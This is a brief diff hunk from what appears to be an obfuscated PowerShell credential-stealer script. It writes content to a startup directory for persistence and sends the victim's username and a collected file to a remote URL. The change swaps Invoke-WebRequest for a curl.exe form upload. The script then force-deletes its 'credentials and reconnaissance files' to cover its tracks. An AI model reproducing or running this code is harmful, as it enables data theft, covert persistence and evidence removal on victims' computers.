@@ -49,7 +49,7 @@ Add-Content -Path $rtsRfiZBxpGP -Value $fXmtFxsAMdGw        #startup dir
 $form_data = @{}
 $form_data["content"] = $env:USERNAME
 $form_data["file"] = Get-Item -Path $rtsRfiZBxpGP
-Invoke-WebRequest -uri $QLxOhYDbSkv -Method Post -Form $form_data
+curl.exe -F "content=$env:USERNAME" -F "file=@$rtsRfiZBxpGP" $QLxOhYDbSkv
 
 # cleanup your credentials and reconnaissance files
 Remove-Item .\QqXjYbeWZoUhT.txt -Force
